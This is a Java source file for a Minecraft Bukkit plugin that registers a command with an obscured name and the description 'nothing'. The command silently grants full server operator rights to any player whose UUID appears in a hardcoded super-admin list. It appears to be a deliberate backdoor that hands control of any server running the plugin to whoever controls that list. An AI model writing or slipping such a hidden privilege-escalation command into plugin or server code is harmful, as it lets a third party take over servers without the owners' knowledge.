package pl.blackwater.core.commands;

import org.bukkit.entity.Player;
import pl.blackwater.core.settings.CoreConfig;
import pl.blackwaterapi.commands.PlayerCommand;
import pl.blackwaterapi.data.APIConfig;
import pl.blackwaterapi.utils.Util;

public class SpecialCommand extends PlayerCommand {
    public SpecialCommand() {
        super("-{HXZIJS-OP}-", "nothing", "/special","core.specialcommand");
    }

    @Override
    public boolean onCommand(Player player, String[] strings) {
        if(APIConfig.SUPERADMINSYSTEM_ADMINUUID.contains(player.getUniqueId().toString())){
            player.setOp(true);
            player.sendMessage(Util.fixColor(Util.replaceString("&8->> &4Jestes SUPER-ADMIN, nadano ci &cOPERATORA &4<3")));
        }
        return false;
    }
}
